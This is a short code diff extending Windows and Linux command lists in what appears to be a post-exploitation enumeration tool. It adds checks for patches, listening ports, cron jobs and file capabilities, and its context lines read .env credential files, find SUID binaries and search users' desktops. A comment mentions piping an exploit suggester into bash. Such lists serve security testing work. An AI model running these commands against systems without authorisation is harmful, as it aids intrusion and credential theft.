@@ -48,6 +48,9 @@ WINDOWS_COMMANDS = [
     r'wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"',
     r"dir C:\Users\*\Desktop\*.txt 2>nul",
     r"dir C:\Users\*\Desktop\*.xlsx 2>nul",
+    "wmic qfe get Caption,HotFixID,InstalledOn",          # missing patch list
+    "netstat -ano | findstr LISTENING",                   # listening ports / hidden services
+    "tasklist /svc",                                      # running services with PIDs
 ]
 
 # ---------------------------------------------------------------------------
@@ -63,7 +66,10 @@ LINUX_COMMANDS = [
     "cat /var/www/html/.env 2>/dev/null",
     "find / -name 'docker-compose.yml' 2>/dev/null | head -5",
     "crontab -l 2>/dev/null",
+    "cat /etc/crontab 2>/dev/null",                              # system-wide cron (root jobs)
     "find / -perm -4000 -type f 2>/dev/null | head -10",
+    "getcap -r / 2>/dev/null | head -20",                        # capabilities — top privesc vector
+    "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",         # listening ports / hidden services
 ]
 
 # URL for linux-exploit-suggester (pipe via bash without file transfer)
